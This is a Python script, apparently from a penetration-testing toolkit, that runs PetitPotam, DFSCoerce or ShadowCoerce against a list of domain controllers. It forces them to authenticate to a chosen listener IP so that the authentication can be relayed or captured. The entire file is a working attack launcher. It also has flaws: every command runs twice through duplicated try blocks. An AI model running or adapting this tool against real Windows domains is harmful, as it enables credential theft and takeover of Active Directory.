import subprocess
import argparse
import os
import psutil
import socket 

def get_default_ip():
     try:
        # Get the IP address of eth0
        interface_info = psutil.net_if_addrs()
        if 'eth0' in interface_info:
            for addr in interface_info['eth0']:
                if addr.family == socket.AF_INET:  # Check for IPv4 address
                    return addr.address
     except Exception as e:
        print(f"Error retrieving IP for eth0: {e} please try manually specifying an IP with '-ip'")

def run(args):
    # Read targets from the file
    with open(args.target_file, "r") as file:
        targets = file.readlines()

    # Loop through each target
    for target in targets:
        target = target.strip()  # Remove any surrounding whitespace
        if target:  # Check if the target is not empty
            match args.mode:
                case 1:
                    command = [
                        "python3", "/home/assess/tools/PetitPotam/PetitPotam.py",
                        args.ip_address,
                        target
                    ]
                case 2:
                    command = [
                        "python3", "/home/assess/tools/PetitPotam/PetitPotam.py",
                        "-d", args.domain,
                        "-u", args.user,
                        "-p", args.password,
                        args.ip_address,
                        target
                    ]
                case 3:
                    command = [
                        "python3", "/home/assess/tools/dfscoerce.py",
                        "-d", args.domain,
                        "-u", args.user,
                        "-p", args.password,
                        args.ip_address,
                        target
                    ]
                case 4:
                    command = [
                        "python3", "/home/assess/tools/shadowcoerce.py",
                        "-d", args.domain,
                        "-u", args.user,
                        "-p", args.password,
                        args.ip_address,
                        target
                    ]
			# Prepare a command string for printing with [REDACTED] for password
            command_str = ' '.join([
                "python3", 
                "PetitPotam.py" if args.mode in [1, 2] else 
                "dfscoerce.py" if args.mode == 3 else 
                "shadowcoerce.py",
                f"-d {args.domain}" if args.mode in [2, 3, 4] else "",
                f"-u {args.user}",
                f"-p [REDACTED]",
                args.ip_address,
                target
            ]).strip()

            # Print the command before executing
            print(command_str)
            try:
                # Execute the command
                subprocess.run(command, check=True)
            except subprocess.CalledProcessError:
                print(f"Failed to execute for target: {target}")
            try:
                # Execute the command
                subprocess.run(command, check=True)
            except subprocess.CalledProcessError:
                print(f"Failed to execute for target: {target}")

def main():
    # Set up argument parsing
    parser = argparse.ArgumentParser(description="Run PetitPotam against multiple targets.")
    parser.add_argument('-d', '--domain', help='Domain name')
    parser.add_argument('-u', '--user', help='Username')
    parser.add_argument('-p', '--password', help='Password')
    parser.add_argument('-ip', '--ip_address', default=get_default_ip(), help='IP address (default: current IP on eth0)')
    parser.add_argument('-t', '--target_file', default='/home/assess/inpen/dcs.txt', help='Path to the file containing target names (default: /home/assess/inpen/dcs.txt)')
    parser.add_argument('-m', '--mode', type=int, required=True, help='Mode of coercion - 1 unauth PetitPotam, 2 auth PetitPotam, 3 DFSCoerce, 4 ShadowCoerce')

    args = parser.parse_args()

    # Check if the target file exists
    if not os.path.isfile(args.target_file):
        print("Input file is missing or cannot be opened.")
        return 
    elif args.mode not in [1, 2, 3, 4]:
        print("Incorrect mode specified.")
        return

    run(args)

if __name__ == "__main__":
    main()
